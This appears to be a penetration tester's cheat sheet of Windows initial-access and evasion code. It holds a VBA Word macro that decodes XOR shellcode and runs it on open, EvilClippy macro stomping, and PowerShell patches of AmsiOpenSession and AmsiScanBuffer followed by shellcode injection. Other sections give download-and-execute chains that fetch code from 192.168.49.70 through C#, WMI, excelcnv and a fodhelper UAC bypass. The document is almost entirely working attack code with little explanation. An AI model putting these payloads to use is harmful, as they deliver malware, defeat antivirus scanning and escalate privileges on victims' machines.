Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Function MyMacro()
Dim t1 As Date
Dim t2 As Date
Dim time As Long
Dim buf As Variant
Dim addr As LongPtr
Dim counter As Long
Dim data As Long
t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)
If time < 2 Then
Exit Function
End If

Dim res As Long
' Xor payload
buf = Array(.....)

For i = 0 To UBound(buf)
buf(i) = buf(i) Xor "170" '170=0xAA
Next i

addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
For counter = LBound(buf) To UBound(buf)
data = buf(counter)
res = RtlMoveMemory(addr + counter, data, 1)
Next counter
res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
Sub Document_Open()
MyMacro
End Sub
Sub AutoOpen()
MyMacro
End Sub

```
## Stomping On Microsoft Word with EvilClippy
### test.bas
```
Sub hello()
    MsgBox "Hello World !"
End Sub
```
### EvilClippy Command
```
EvilClippy.exe -s test.bas "xxxxxx.doc"
```
## BAT TO EXE C#
```
using System.Runtime.InteropServices;
namespace BAT
{
    public class Write
    {
        [DllImport("msvcrt.dll")] public static extern int system(string cmd); public static void Main()
        {
            string Command = "powershell -ep bypass -c \"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.70/ClassLibrary1.dll');$ass = [System.Reflection.Assembly]::Load($data);$class = $ass.GetType('ClassLibrary1.Class1');$method = $class.GetMethod('runner');$method.Invoke(0,$null)\""; 
            system(Command); 
        }
    }
}
```
## Powershell Patching asmiopensession Script
```
function LookupFunc {
Param ($moduleName, $functionName)
$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$assem.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") { $tmp+=$_} }
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}


function getDelegateType {
Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
$type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession

$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = ......

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$t1 = (Get-Date).Second
Start-Sleep 2
$t2 = (Get-Date).Second - $t1 
if (1.5 > $t2)
{
    write-host "1";
}           

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)

```
## Powershell Patching AmsiScanBufferBypass Script
https://github.com/rasta-mouse/AmsiScanBufferBypass
```
function LookupFunc {

Param ($moduleName,$functionName)

$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |

Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split("\\")[-1].Equals("System.dll") }).GetType("Microsoft.Win32.UnsafeNativeMethods")
$tmp=@()

$assem.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") { $tmp+=$_} }

return $tmp[0].Invoke($null, @(($assem.GetMethod("GetModuleHandle")).Invoke($null,@($moduleName)), $functionName))

}


function getDelegateType {
Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule", $false).DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass",[System.MulticastDelegate])
$type.DefineConstructor("RTSpecialName, HideBySig, Public",[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags("Runtime, Managed")
$type.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $delType, $func).SetImplementationFlags("Runtime, Managed")
return $type.CreateType()
}

$func = "Amsi"+"Scan"+"Buffer"
[IntPtr]$funcAddr = LookupFunc amsi.dll $func

$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 6)

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = .....

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$t1 = (Get-Date).Second
Start-Sleep 2
$t2 = (Get-Date).Second - $t1 
if (1.5 > $t2)
{
    write-host "1";
}           

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```
## powershell Encodecommnad with AmsiScanBufferBypass
```
$Text = 'function LookupFunc {

Param ($moduleName,$functionName)

$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |

Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split("\\")[-1].Equals("System.dll") }).GetType("Microsoft.Win32.UnsafeNativeMethods")
$tmp=@()

$assem.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") { $tmp+=$_} }

return $tmp[0].Invoke($null, @(($assem.GetMethod("GetModuleHandle")).Invoke($null,@($moduleName)), $functionName))

}


function getDelegateType {
Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule", $false).DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass",[System.MulticastDelegate])
$type.DefineConstructor("RTSpecialName, HideBySig, Public",[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags("Runtime, Managed")
$type.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $delType, $func).SetImplementationFlags("Runtime, Managed")
return $type.CreateType()
}
try {
$func = "Amsi"+"Scan"+"Buffer"
[IntPtr]$funcAddr = LookupFunc amsi.dll $func

$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 6)

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = .....

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
        

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
}
catch {
    $postParams = @{debug="$Error[0]"}
Invoke-WebRequest -Uri http://192.168.49.70/debug.php -Method POST -Body $postParams -UseBasicParsing
}'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText > test.txt

```
## EXCEL LOLBIN excute powershell
```
$dirs = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
Do { 
C:\Program*\Microsoft*\Office16\excelcnv.exe -oice http://192.168.49.70/test.txt "$env:TEMP\$dirs.zip"
start-sleep 3
$fileexists  = Test-Path "$env:TEMP\$dirs.zip"
if ($fileexists){break}
} while(!$fileexists)

Do {
expand-archive -path "$env:TEMP\$dirs.zip" -destinationpath "$env:TEMP\$dirs"
start-sleep 3
$fileexists  = Test-Path "$env:TEMP\$dirs\xl\sharedStrings.xml"
if ($fileexists){break}
} while(!$fileexists)

$XMLpath = "$env:TEMP\$dirs\xl\sharedStrings.xml"
[xml]$XmlDocument = Get-Content -Path $XMLpath
$commnad = $XmlDocument.sst.InnerText
$Decodedcommnad = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($commnad))
IEX($Decodedcommnad)
```
## WMI VBA
```
Sub MyMacro()

strArg = "powershell -exec bypass -nop -c iex([Net.Webclient]::new().DownloadString('http://192.168.49.70/run.txt'))"
GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid

End Sub

Sub AutoOpen()

MyMacro

End Sub
```
## FodHelper UAC Bypass Powershell
runner.txt content with disable AMSI
```
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.49.70/runner.txt') | IEX" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```
## VBA AMSI bypass
```
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
    if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
    {
    throw new Error(1, '');
    }
    }
catch(e)

{
    filesys.CopyFile("C:\\Windows\\System32\\wscript.exe","C:\\Windows\\Tasks\\AMSI.dll");
    sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName);
    WScript.Quit(1);
}
```


